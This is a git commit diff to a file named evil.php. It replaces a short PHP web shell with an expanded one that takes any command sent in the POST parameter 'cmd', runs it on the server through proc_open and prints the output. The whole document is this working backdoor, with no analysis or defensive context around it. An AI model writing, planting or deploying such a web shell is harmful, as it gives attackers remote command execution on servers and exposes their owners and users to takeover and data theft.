816f5c6984d6282b98b1aed25a286aeefaa0fb88
vert16x <99372545+vert16x@users.noreply.github.com>
2022-02-10 21:45:47 -0300

    vert16x

--- evil.php
+++ evil.php
@@ -1,6 +1,15 @@
 <?php 
-if(isset($_POST["cmd"])){
-    exec($_POST["cmd"]);
-} else {
-    echo "1337";
-}
+	echo "vert16x\n";
+	if(isset($_POST["cmd"])){
+    	$cmd = ($_POST['cmd']);
+	
+	function exec_command($command)
+		{$descriptorspec = array(0 => array("pipe", "r"),1 => array("pipe", "w"),2 => array("file", "error-output.txt", "a"));
+		$cwd = "";$env = array('some_option' => 'aeiou');
+		$process = proc_open($command, $descriptorspec, $pipes, $cwd, $env);
+		if (is_resource($process))
+	        	{echo stream_get_contents($pipes[1]); 
+			fclose($pipes[1]);proc_close($process);
+		}}exec_command($cmd); exit; 
+	}
+?>
